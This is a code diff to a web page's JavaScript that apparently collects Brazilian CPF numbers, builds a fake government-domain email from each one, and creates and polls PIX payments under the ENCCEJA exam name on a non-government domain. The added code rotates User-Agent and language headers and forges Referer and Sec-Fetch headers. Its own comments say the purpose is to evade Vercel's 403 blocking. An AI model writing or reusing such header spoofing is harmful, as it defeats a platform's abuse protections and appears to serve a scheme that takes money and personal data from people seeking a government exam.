@@ -681,12 +681,56 @@
         let transactionId = null;
         let checkStatusInterval = null;
         
+        // Função para gerar headers aleatórios para evitar 403 da Vercel
+        function generateRandomHeaders() {
+            // Lista de user agents
+            const userAgents = [
+                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
+                'Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/85.0.4183.109 Mobile/15E148 Safari/604.1',
+                'Mozilla/5.0 (Android 12; Mobile; rv:68.0) Gecko/68.0 Firefox/94.0',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15',
+                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
+            ];
+            
+            // Lista de linguagens
+            const languages = [
+                'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+                'en-US,en;q=0.9,pt-BR;q=0.8,pt;q=0.7',
+                'es-ES,es;q=0.9,pt;q=0.8,en;q=0.7',
+                'fr-FR,fr;q=0.9,en;q=0.8,pt-BR;q=0.7'
+            ];
+            
+            // Gerando timestamps para cache
+            const cacheBuster = Date.now() + Math.floor(Math.random() * 1000);
+            
+            // Construindo headers aleatórios
+            return {
+                'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+                'Accept-Language': languages[Math.floor(Math.random() * languages.length)],
+                'Cache-Control': Math.random() > 0.5 ? 'no-cache' : 'max-age=0',
+                'X-Requested-With': 'XMLHttpRequest',
+                'X-Cache-Buster': cacheBuster.toString(),
+                'Referer': 'https://encceja2025.com.br/thank_you',
+                'Sec-Fetch-Site': 'same-origin',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Dest': 'empty',
+                'Content-Type': 'application/json',
+            };
+        }
+        
         function checkPaymentStatus() {
             if (!transactionId) return;
             
             console.log("Verificando status do pagamento:", transactionId);
             
-            fetch(`/check-for4payments-status?transaction_id=${encodeURIComponent(transactionId)}`)
+            // Usar headers aleatórios para evitar bloqueio da API
+            const randomHeaders = generateRandomHeaders();
+            console.log("Usando headers aleatórios:", JSON.stringify(randomHeaders));
+            
+            fetch(`/check-for4payments-status?transaction_id=${encodeURIComponent(transactionId)}`, {
+                headers: randomHeaders
+            })
                 .then(response => response.json())
                 .then(data => {
                     console.log("Resposta do status do pagamento:", data);
@@ -795,12 +839,14 @@
             const cleanCpf = userData.cpf.replace(/\D/g, '');
             const email = `${cleanCpf}@participante.encceja.gov.br`;
             
+            // Usar headers aleatórios para evitar bloqueio 403 da Vercel
+            const randomHeaders = generateRandomHeaders();
+            console.log("Usando headers aleatórios para criar pagamento:", JSON.stringify(randomHeaders));
+            
             // Enviar requisição para criar o pagamento
             fetch('/create-pix-payment', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
+                headers: randomHeaders,
                 body: JSON.stringify({
                     name: cleanName,
                     cpf: cleanCpf,
